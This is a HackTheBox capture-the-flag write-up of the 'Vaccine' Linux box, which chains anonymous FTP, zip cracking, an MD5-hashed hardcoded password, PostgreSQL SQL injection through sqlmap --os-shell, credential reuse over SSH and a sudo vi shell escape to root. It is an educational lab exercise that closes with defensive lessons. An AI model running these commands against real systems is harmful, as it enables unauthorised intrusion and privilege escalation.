---
title: "vaccine"
date: 2026-01-31
draft: false
tags: ["linux", "web", "very easy"]
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Linux (Ubuntu 20.04)"
    difficulty: "Very Easy"
ShowToc: true
---

# Vaccine — HackTheBox Writeup

Vaccine is a Very Easy Linux box that chains together several classic web exploitation techniques: anonymous FTP access, zip cracking, hardcoded credentials, SQL injection, and a sudo misconfiguration that hands over root in seconds. Each step feeds directly into the next, making it an excellent box for learning how a real attack chain flows from initial recon to full compromise.

---

## Overview

| Field | Value |
|-------|-------|
| **IP** | <TARGET> |
| **OS** | Linux (Ubuntu 20.04) |
| **Difficulty** | Very Easy |

---

## Reconnaissance

### Port Scan

I always start with a service/version scan using Nmap's default scripts (`-sC`) alongside version detection (`-sV`). Treating the target as if ICMP is blocked from the start (`-Pn`) saves frustration on boxes that don't respond to ping.

```bash
nmap -sC -sV -Pn <TARGET>
```

![terminal output](terminal_01.png)

Three services: FTP with anonymous login enabled, SSH, and a PHP web app called "MegaCorp Login". Anonymous FTP is always worth investigating first — it's free information with zero effort.

### FTP Enumeration

Logging in anonymously and grabbing whatever's available is a one-liner:

```bash
ftp anonymous@<TARGET>
```

There's a single file: `backup.zip`. I pulled it down with `get backup.zip` and disconnected.

### Cracking the Zip

The archive is password-protected, but that's rarely a blocker. `zip2john` extracts the hash in a format John the Ripper can work with:

```bash
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![terminal output](terminal_02.png)

Password is `741852963`. Inside the zip are two files: `index.php` and `style.css` — a backup of the web application's login page.

### Hardcoded Credentials in Source

Reading through `index.php`, the login logic immediately stands out:

```php
if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === '2cb42f8734ea607eefed3b70af13bbd3') {
```

The password is stored as an MD5 hash. MD5 is not a password hashing function — it's a general-purpose digest with no salting, and massive precomputed rainbow tables exist for it. A quick search (or `hashcat` / `john`) resolves `2cb42f8734ea607eefed3b70af13bbd3` to `qwerty789` almost instantly.

We now have valid credentials for the web app: **`admin` / `qwerty789`**.

---

## Foothold

### SQL Injection on dashboard.php

Logging into the MegaCorp portal at `http://<TARGET>` with those credentials redirects to `dashboard.php`, which has a search feature for cars. The URL parameter looks like:

```
http://<TARGET>/dashboard.php?search=
```

My first instinct when I see a search box backed by a database is to test for SQL injection. Appending a single quote to break out of a string context is the classic first probe:

```
http://<TARGET>/dashboard.php?search=shell'
```

![terminal output](terminal_03.png)

PostgreSQL throws a verbose error that leaks the actual query. The `ilike` operator is PostgreSQL-specific (case-insensitive LIKE), which tells us exactly what backend we're dealing with. The query structure `ilike '%[input]%'` is a textbook injectable parameter.

### Automating with sqlmap

Rather than manually crafting payloads for a PostgreSQL stacked-query injection, I handed this off to `sqlmap`. The `--os-shell` flag is the goal — PostgreSQL's `COPY TO/FROM PROGRAM` feature allows executing OS commands if you have the right permissions, and the `postgres` superuser typically does.

I first captured a legitimate authenticated request with Burp to get the session cookie, then:

```bash
sqlmap -u "http://<TARGET>/dashboard.php?search=test" \
  --cookie="PHPSESSID=<your_session_id>" \
  --os-shell
```

sqlmap confirmed stacked queries and UNION-based injection, then established an OS shell via `COPY TO/FROM PROGRAM`. From this shell I could run arbitrary commands as the `postgres` OS user.

### Recovering SSH Credentials from PHP

With command execution on the box, the next move is to look for credentials in the web application files. Database connection strings in PHP are a goldmine:

```bash
cat /var/www/html/dashboard.php
```

![terminal output](terminal_04.png)

The PostgreSQL connection string hands us the password: **`postgres` / `P@s5w0rd!`**. Developers frequently reuse database passwords as system account passwords, and this box is no exception. SSH works immediately:

```bash
ssh postgres@<TARGET>
```

We're in as `postgres` and can grab the user flag.

---

## Privilege Escalation

### Checking sudo Permissions

The first thing I run after landing a shell is `sudo -l` — it shows what commands the current user can run as other users without a full password prompt (or sometimes with none at all):

```bash
sudo -l
```

![terminal output](terminal_05.png)

The `postgres` user can run `vi` as root on a specific config file. The intent was probably to allow the database admin to edit the PostgreSQL host-based authentication config without full root access. The problem is that `vi` — like most text editors — can spawn a shell from within the editor. This is documented extensively on [GTFOBins](https://gtfobins.github.io/gtfobins/vi/).

### vi Shell Escape

I opened the file with sudo:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Then, from within `vi`'s command mode, I dropped into a shell with a single command:

```
:!/bin/bash
```

That's it. `vi` executes the command in a shell, and since `vi` was running as root, the shell inherits root privileges. We now have a root shell and can grab the root flag.

---

## Lessons Learned

**Anonymous FTP is still a finding.** It's easy to dismiss as low-severity, but here it was the starting point for the entire chain. Always check anonymous FTP for files — even a "backup" that looks innocuous.

**Password-protected zips provide minimal security.** `zip2john` + `rockyou.txt` cracked this in under two seconds. Zip encryption is not a substitute for proper secrets management.

**MD5 is not a password hash.** It's a checksum. Any hardcoded MD5 in source code should be treated as plaintext. Use `hashcat` mode `0` or just search common hash databases.

**PostgreSQL's `ilike` in a URL parameter is a strong SQLi signal.** The verbose error output from PostgreSQL is extremely helpful for confirming injection and understanding query structure.

**`sqlmap --os-shell` via PostgreSQL.** When sqlmap has stacked query execution against a PostgreSQL backend running as a superuser, `COPY TO/FROM PROGRAM` gives you OS-level command execution. This is a well-known PostgreSQL feature that becomes a serious vulnerability in this context.

**Database connection strings in PHP frequently yield SSH credentials.** After gaining any foothold on a web server, reading the application's database config files should be a reflex. `grep -r "pg_connect\|mysqli_connect\|PDO" /var/www/` is a fast way to find them.

**Any `sudo` entry allowing a text editor is an instant privesc.** `vi`, `vim`, `nano`, `less`, `more` — all of them can escape to a shell. If you see these in `sudo -l` output, check GTFOBins immediately. The fix is to use `sudoedit` or `sudo -e`, which strips the ability to run arbitrary shell commands, rather than granting direct editor access.
